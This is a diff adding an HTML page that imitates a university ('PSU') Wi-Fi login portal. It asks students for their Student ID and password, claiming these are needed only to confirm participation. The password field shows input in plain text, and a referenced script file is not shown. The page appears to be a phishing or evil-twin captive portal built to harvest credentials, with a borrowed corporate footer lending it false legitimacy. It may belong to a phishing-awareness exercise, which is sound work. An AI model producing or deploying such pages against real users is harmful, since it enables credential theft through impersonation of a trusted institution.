@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PSU LOGIN</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<script src="app.js"></script>
+
+<body>
+  <div class="wrap">
+    <div class="card" role="region" aria-label="PSU Login Portal">
+      <div class="header">
+        <div class="logo" aria-hidden="true"></div>
+        <div>
+          <h1>Login to PSU Portal <span class="badge">Wi-Fi</span></h1>
+        </div>
+      </div>
+
+      <div class="content">
+        
+        <div id="notice" class="notice" style="display:none;">
+          Username is incorrect.
+        </div>
+
+
+        <p>
+          Enter your <strong>Student ID</strong> and <strong>Password</strong> to continue. This is used only to confirm participation.
+        </p>
+
+        <form id="loginForm" action="/success.html">
+          <label for="Student_ID">Student ID</label>
+          <input id="Student_ID" name="Student_ID" type="text" autocomplete="off" placeholder="e.g., 16-UR-0215" required />
+
+          <label for="password">Password</label>
+          <input id="password" name="password" type="text" autocomplete="off" placeholder="****" required />
+
+          <div class="row">
+            <button type="submit">Continue</button>
+          </div>
+
+        </form>
+      </div>
+
+      <div class="footer">
+        © <span id="yr"></span> All rights reserved.<br/>
+        DATALINE Philippines. August 2003 8th Floor, Ortigas Building, Ortigas Avenue Pasig City, Philippines 
+        Telephone (+632) 634-1529, 634-1958
+      </div>
+    </div>
+  </div>
+
+</body>
+</html>
